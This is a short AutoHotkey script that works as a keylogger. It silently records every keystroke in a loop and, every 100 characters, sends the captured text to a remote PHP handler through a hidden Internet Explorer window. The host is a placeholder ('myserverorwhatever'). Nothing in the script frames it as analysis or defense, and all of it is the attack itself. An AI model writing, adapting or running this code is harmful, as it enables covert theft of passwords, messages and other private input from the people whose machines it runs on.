store :=

Log(key)
{
url := "http://myserverorwhatever/folderorsomeshit/handler.php?key="key
browse := ComObjCreate("InternetExplorer.Application")
browse.Visible := false
browse.navigate(url)
while browse.Busy
sleep 1
browse.Quit
}
Loop
{
Input, key, B I L1 V
store = %store%%key%
if(StrLen(store) > 99)
{
Log(store)
store = 
}
}
